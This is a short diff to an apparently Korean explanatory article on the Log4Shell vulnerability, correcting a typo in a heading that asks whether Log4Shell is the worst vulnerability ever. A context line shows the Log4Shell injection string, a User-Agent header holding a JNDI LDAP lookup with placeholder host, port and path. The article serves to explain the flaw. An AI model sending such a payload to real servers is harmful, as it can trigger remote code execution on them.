@@ -83,7 +83,7 @@ User-Agent : ${jndi:ldap://<host>:<port>/<path>}
 
 -----
 
-## Log4Shell 취약점은 사상 최약의 취약점?
+## Log4Shell 취약점은 사상 최악의 취약점?
 
 Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 단계의 취약점으로 분류된다.
 
